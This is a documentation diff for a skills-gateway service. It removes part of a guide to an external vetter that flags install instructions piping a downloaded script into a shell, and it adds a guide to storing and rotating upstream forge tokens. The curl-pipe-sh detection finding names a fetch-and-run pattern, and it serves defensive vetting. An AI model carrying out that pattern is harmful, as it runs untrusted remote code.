-<a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a>                <span class="p">})</span>
-<a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a>    <span class="k">return</span> <span class="n">findings</span> <span class="o">+</span> <span class="n">review_with_model</span><span class="p">(</span><span class="n">files</span><span class="p">)</span>
-<a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a>
-<a id="__codelineno-2-42" name="__codelineno-2-42" href="#__codelineno-2-42"></a>
-<a id="__codelineno-2-43" name="__codelineno-2-43" href="#__codelineno-2-43"></a><span class="k">class</span><span class="w"> </span><span class="nc">Handler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
-<a id="__codelineno-2-44" name="__codelineno-2-44" href="#__codelineno-2-44"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">do_POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-<a id="__codelineno-2-45" name="__codelineno-2-45" href="#__codelineno-2-45"></a>        <span class="n">request</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">rfile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">"Content-Length"</span><span class="p">])))</span>
-<a id="__codelineno-2-46" name="__codelineno-2-46" href="#__codelineno-2-46"></a>        <span class="n">findings</span> <span class="o">=</span> <span class="n">review</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"files"</span><span class="p">,</span> <span class="p">[]))</span>
-<a id="__codelineno-2-47" name="__codelineno-2-47" href="#__codelineno-2-47"></a>        <span class="n">body</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
-<a id="__codelineno-2-48" name="__codelineno-2-48" href="#__codelineno-2-48"></a>            <span class="s2">"state"</span><span class="p">:</span> <span class="s2">"fail"</span> <span class="k">if</span> <span class="n">findings</span> <span class="k">else</span> <span class="s2">"pass"</span><span class="p">,</span>
-<a id="__codelineno-2-49" name="__codelineno-2-49" href="#__codelineno-2-49"></a>            <span class="s2">"reportUrl"</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span>
-<a id="__codelineno-2-50" name="__codelineno-2-50" href="#__codelineno-2-50"></a>            <span class="s2">"findings"</span><span class="p">:</span> <span class="n">findings</span><span class="p">,</span>
-<a id="__codelineno-2-51" name="__codelineno-2-51" href="#__codelineno-2-51"></a>        <span class="p">})</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
-<a id="__codelineno-2-52" name="__codelineno-2-52" href="#__codelineno-2-52"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
-<a id="__codelineno-2-53" name="__codelineno-2-53" href="#__codelineno-2-53"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span> <span class="s2">"application/json"</span><span class="p">)</span>
-<a id="__codelineno-2-54" name="__codelineno-2-54" href="#__codelineno-2-54"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s2">"Content-Length"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">)))</span>
-<a id="__codelineno-2-55" name="__codelineno-2-55" href="#__codelineno-2-55"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>
-<a id="__codelineno-2-56" name="__codelineno-2-56" href="#__codelineno-2-56"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
-<a id="__codelineno-2-57" name="__codelineno-2-57" href="#__codelineno-2-57"></a>
-<a id="__codelineno-2-58" name="__codelineno-2-58" href="#__codelineno-2-58"></a>
-<a id="__codelineno-2-59" name="__codelineno-2-59" href="#__codelineno-2-59"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
-<a id="__codelineno-2-60" name="__codelineno-2-60" href="#__codelineno-2-60"></a>    <span class="n">HTTPServer</span><span class="p">((</span><span class="s2">"0.0.0.0"</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"PORT"</span><span class="p">,</span> <span class="s2">"8765"</span><span class="p">))),</span> <span class="n">Handler</span><span class="p">)</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+<h2 id="supplying-the-token">Supplying the token<a class="headerlink" href="#supplying-the-token" title="Permanent link">&para;</a></h2>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:3"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Local development</label><label for="__tabbed_1_2">Kubernetes (Helm)</label><label for="__tabbed_1_3">AWS ECS / Fargate</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<p>Keep the token in a file outside the repository, and read it into the
+environment when you start the gateway:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="gp">$ </span>install<span class="w"> </span>-m<span class="w"> </span><span class="m">600</span><span class="w"> </span>/dev/null<span class="w"> </span>~/.config/skills-gateway/acme-token
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="gp">$ </span><span class="nv">$EDITOR</span><span class="w"> </span>~/.config/skills-gateway/acme-token
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="gp">$ </span><span class="nv">SGW_UPSTREAM_ACME_TOKEN</span><span class="o">=</span><span class="s2">"</span><span class="k">$(</span>cat<span class="w"> </span>~/.config/skills-gateway/acme-token<span class="k">)</span><span class="s2">"</span><span class="w"> </span>./mvnw<span class="w"> </span>spring-boot:run
 </code></pre></div>
-<p>Run it:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="gp">$ </span>python3<span class="w"> </span>external-vetter.py
+<p>Put the <code>upstream-credentials</code> block in a configuration file that is also
+outside the repository, and point <code>SPRING_CONFIG_ADDITIONAL_LOCATION</code> at its
+directory. See
+<a href="../deploying-without-kubernetes/#supplying-a-configuration-file">Supplying a configuration file</a>.
+The file then holds only the <code>${SGW_UPSTREAM_ACME_TOKEN}</code> reference, never
+the token.</p>
+</div>
+<div class="tabbed-block">
+<p>The entry goes in the chart's <code>config</code>. The token goes in a Secret, and
+<code>extraEnv</code> exposes it through <code>secretKeyRef</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="gp">$ </span>kubectl<span class="w"> </span>create<span class="w"> </span>secret<span class="w"> </span>generic<span class="w"> </span>skills-gateway-upstreams<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">    </span>--from-file<span class="o">=</span>acme-token<span class="o">=</span>./acme-token
 </code></pre></div>
-<p>It listens on <code>:8765</code>. Posting it the exact request from
-<a href="#1-the-wire-contract">the wire contract</a> above returns:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nt">config</span><span class="p">:</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span><span class="nt">skills-gateway</span><span class="p">:</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="nt">ingestion</span><span class="p">:</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">      </span><span class="nt">upstream-credentials</span><span class="p">:</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">url-prefix</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://github.com/acme/</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">          </span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">skills-gateway</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">          </span><span class="nt">token</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${SGW_UPSTREAM_ACME_TOKEN}</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="nt">extraEnv</span><span class="p">:</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">SGW_UPSTREAM_ACME_TOKEN</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">    </span><span class="nt">valueFrom</span><span class="p">:</span>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="w">      </span><span class="nt">secretKeyRef</span><span class="p">:</span>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="w">        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">skills-gateway-upstreams</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="w">        </span><span class="nt">key</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">acme-token</span>
+</code></pre></div>
+<p><code>config</code> is a ConfigMap, so it only ever holds the reference. See
+<a href="../deploying-on-kubernetes/#single-settings-and-secrets-extraenv-extraenvfrom">Deploying on Kubernetes</a>.</p>
+</div>
+<div class="tabbed-block">
+<p>Store the token in Secrets Manager and map it into the container with the
+task definition's <code>secrets</code>. Supply the entry itself as configuration, for
+example through <code>SPRING_APPLICATION_JSON</code> or indexed variables (see
+<a href="../deploying-without-kubernetes/#lists">Property names as environment variables</a>):</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="p">{</span>
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">    </span><span class="nt">"state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"fail"</span><span class="p">,</span>
-<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">    </span><span class="nt">"reportUrl"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
-<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">    </span><span class="nt">"findings"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">        </span><span class="p">{</span>
-<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">            </span><span class="nt">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"curl-pipe-sh"</span><span class="p">,</span>
-<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">            </span><span class="nt">"severity"</span><span class="p">:</span><span class="w"> </span><span class="s2">"high"</span><span class="p">,</span>
-<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">            </span><span class="nt">"location"</span><span class="p">:</span><span class="w"> </span><span class="s2">"plugins/hello/INSTALL.md:5"</span><span class="p">,</span>
-<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">            </span><span class="nt">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"instructions pipe a downloaded script straight into a shell"</span>
-<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w">        </span><span class="p">}</span>
-<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">    </span><span class="p">]</span>
-<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="p">}</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">  </span><span class="nt">"containerDefinitions"</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">    </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"skills-gateway"</span><span class="p">,</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">    </span><span class="nt">"environment"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">      </span><span class="p">{</span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SKILLSGATEWAY_INGESTION_UPSTREAMCREDENTIALS_0_URLPREFIX"</span><span class="p">,</span><span class="w"> </span><span class="nt">"value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://github.com/acme/"</span><span class="p">},</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">      </span><span class="p">{</span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SKILLSGATEWAY_INGESTION_UPSTREAMCREDENTIALS_0_USERNAME"</span><span class="p">,</span><span class="w"> </span><span class="nt">"value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"skills-gateway"</span><span class="p">},</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">      </span><span class="p">{</span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SKILLSGATEWAY_INGESTION_UPSTREAMCREDENTIALS_0_TOKEN"</span><span class="p">,</span><span class="w"> </span><span class="nt">"value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"${SGW_UPSTREAM_ACME_TOKEN}"</span><span class="p">}</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="w">    </span><span class="p">],</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="w">    </span><span class="nt">"secrets"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="w">      </span><span class="p">{</span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SGW_UPSTREAM_ACME_TOKEN"</span><span class="p">,</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">       </span><span class="nt">"valueFrom"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:secretsmanager:eu-north-1:111122223333:secret:skills-gateway/upstream-acme"</span><span class="p">}</span>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">    </span><span class="p">]</span>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">  </span><span class="p">}]</span>
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="p">}</span>
 </code></pre></div>
-<p>That is a real transcript: the script above, run and posted to with <code>curl</code>,
-produced exactly this output. <code>review_with_model(files)</code> is the seam for the
-part this example does not do: call out to an LLM or a sandbox and translate
-its answer into the same finding shape. It returns no findings on its own.</p>
-<h2 id="3-configure-the-gateway">3. Configure the gateway<a class="headerlink" href="#3-configure-the-gateway" title="Permanent link">&para;</a></h2>
-<p>Declare the connector under <code>skills-gateway.vetting.external</code> and point it at
-your endpoint:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nt">skills-gateway</span><span class="p">:</span>
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span><span class="nt">vetting</span><span class="p">:</span>
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span><span class="nt">external</span><span class="p">:</span>
-<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">curl-pipe-sh-check</span>
-<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">        </span><span class="nt">url</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">http://external-vetter:8765/</span>
-<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">        </span><span class="nt">order</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">150</span>
-<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">        </span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s">"1"</span>
-<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">        </span><span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Flags install instructions that pipe curl into a shell</span>
-<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">        </span><span class="nt">token</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${VETTING_LLM_TOKEN}</span>
-</code></pre></div>
-<p><code>order</code> places it in the chain alongside the built-ins (<code>secret-scan=100</code>,
-<code>prompt-injection=200</code>, <code>license-scan=300</code>, <code>skill-conformance=400</code>); <code>version</code>
-is stamped into the chain identity, so bump it whenever your rules change. The
-full property list, including timeouts and size caps, is in
-<a href="../../reference/configuration/#external-connectors">Configuration, External connectors</a>.</p>
-<p>A docker compose fragment running the example alongside the gateway:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nt">services</span><span class="p">:</span>
-<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">  </span><span class="nt">external-vetter</span><span class="p">:</span>
-<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python:3.13-slim</span>
-<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
-<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./docs/manual/guides/examples/external-vetter.py:/app/external-vetter.py:ro</span>
-<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">"python3"</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">"/app/external-vetter.py"</span><span class="p p-Indicator">]</span>
-<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
-<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">"8765:8765"</span>
-<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
-<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="w">  </span><span class="nt">gateway</span><span class="p">:</span>
-<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
-<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="w">      </span><span class="nt">VETTING_LLM_TOKEN</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${VETTING_LLM_TOKEN}</span>
-<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span>
-<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">external-vetter</span>
-</code></pre></div>
-<h2 id="4-see-it-run">4. See it run<a class="headerlink" href="#4-see-it-run" title="Permanent link">&para;</a></h2>
-<p>Once configured, the connector's vetter behaves like any other in the chain:</p>
-<ul>
-<li><strong>The portal</strong> shows it in the chain flow on a snapshot's vetting tab,
-  alongside the built-ins, with its findings and report link if it set one.</li>
-<li><strong><code>GET /api/v1/snapshots/{id}/vetting</code></strong> lists it in <code>run.verdicts</code> and in the
-  <code>vetters</code> array, with <code>"external":true</code>.</li>
-<li><strong>The ledger</strong> records one <code>vetting-verdict</code> entry for it on every run, same
-  as a built-in.</li>
-<li><strong><code>PUT /api/v1/vetting/vetters/{name}/toggle</code></strong> switches it off globally or for
-  one marketplace, the same way as a built-in. See
-  <a href="../../reference/api/marketplaces/#vetter-enabledisable">Vetter enable/disable</a>.</li>
-</ul>
-<h2 id="misbehaviour-and-how-it-is-handled">Misbehaviour and how it is handled<a class="headerlink" href="#misbehaviour-and-how-it-is-handled" title="Permanent link">&para;</a></h2>
-<p>Your endpoint is a dependency the gateway does not control, so every way it
-can fail to produce a trustworthy verdict is handled fail-closed. See
-<a href="../../reference/configuration/#external-connectors">Configuration, External connectors</a>
-and <a href="../../concepts/vetting/#external-connectors">Vetting, External connectors</a>
-for the full rules; in outline:</p>
+<p>Spring takes a list from one configuration source as a whole. Keep every
+field of every entry in the same place (all in the environment, as here, or
+all in one file), or an entry loses the fields declared elsewhere and the
+gateway refuses to start.</p>
+<p>The task <strong>execution role</strong> needs <code>secretsmanager:GetSecretValue</code> on that
+secret, plus <code>kms:Decrypt</code> if it is encrypted with a customer-managed key.
+ECS resolves the secret when the task starts. The value never appears in
+the task definition.</p>
+</div>
+</div>
+</div>
+<h2 id="rotating-a-token">Rotating a token<a class="headerlink" href="#rotating-a-token" title="Permanent link">&para;</a></h2>
+<p>The credentials are read once, at startup. A rotated token reaches the gateway
+on its <strong>next start</strong>:</p>
+<ol>
+<li>Issue the new token at the forge.</li>
+<li>Update the secret: the file, the Kubernetes Secret or the Secrets Manager
+   value.</li>
+<li>Restart the gateway. On Kubernetes, <code>kubectl rollout restart</code>. On ECS,
+   force a new deployment.</li>
+<li>Revoke the old token.</li>
+</ol>
+<p>Between steps 3 and 4 both tokens work, so nothing fails during the rotation.</p>
+<h2 id="when-the-gateway-refuses-to-start">When the gateway refuses to start<a class="headerlink" href="#when-the-gateway-refuses-to-start" title="Permanent link">&para;</a></h2>
+<p>The gateway refuses to start when an entry cannot work as written. The message
+names the entry by its position and prefix, never by its token:</p>
 <table>
 <thead>
 <tr>
-<th>Misbehaviour</th>
-<th>Recorded as</th>
+<th>Message says</th>
+<th>Cause</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Unreachable (refused, DNS failure, reset)</td>
-<td><code>ERROR</code>, blocks</td>
+<td><code>still holds an unresolved ${...} reference</code></td>
+<td>The environment variable the entry refers to is not set. Without this check, Spring would send the literal text <code>${…}</code> as the password.</td>
 </tr>
 <tr>
-<td>Slow (exceeds <code>connect-timeout</code> / <code>read-timeout</code>)</td>
-<td><code>ERROR</code>, blocks</td>
+<td><code>is blank</code></td>
+<td>The username or token is empty.</td>
 </tr>
 <tr>
-<td>Oversized (response over <code>max-response-bytes</code>)</td>
-<td><code>ERROR</code>, blocks</td>
+<td><code>must use https</code></td>
+<td>An <code>http</code> prefix to a host that is not loopback.</td>
 </tr>
 <tr>
-<td>Malformed (non-2xx, empty body, unparseable JSON, unrecognized <code>state</code>, invalid finding)</td>
-<td><code>ERROR</code>, blocks</td>
+<td><code>must be an absolute http(s) URL with no userinfo, query, fragment, …</code></td>
+<td>The prefix is not a plain <code>https://host[:port]/path</code> URL.</td>
 </tr>
 <tr>
-<td>Pass-with-critical (<code>state: pass</code> alongside a <code>high</code>/<code>critical</code> finding)</td>
-<td>Recorded as the worse of the two, never a clean pass</td>
+<td><code>already declares</code></td>
+<td>Two entries for the same prefix. Which token applied would be an accident of ordering.</td>
 </tr>
 </tbody>
 </table>
-<h2 id="pointers">Pointers<a class="headerlink" href="#pointers" title="Permanent link">&para;</a></h2>
-<ul>
-<li><a href="../../concepts/vetting/#external-connectors">Vetting, the vetter chain</a>:
-  how a connector's vetter fits into the chain and its guarantees.</li>
-<li><a href="../../reference/configuration/#external-connectors">Configuration, External connectors</a>:
-  every property, defaults, and the fail-closed rules in full.</li>
-<li><a href="https://github.com/skillsgateway/skillsgateway/blob/main/docs/decisions/0009-external-vetting-connector-contract.md">ADR 0009</a>:
-  why the contract is configured, synchronous and fail-closed.</li>
-<li><a href="../waiving-findings/">Waiving a vetting finding</a>: accepting a risk an
-  external vetter raised, the same way as a built-in's.</li>
-</ul>
+<h2 id="not-yet">Not yet<a class="headerlink" href="#not-yet" title="Permanent link">&para;</a></h2>
+<p>A GitHub App, with short-lived installation tokens and rotation without a
+restart, is a later credential kind under the same prefix matching. SSH keys,
+per-marketplace credentials and credentials stored in the database are not
+planned.</p>
 
 
 
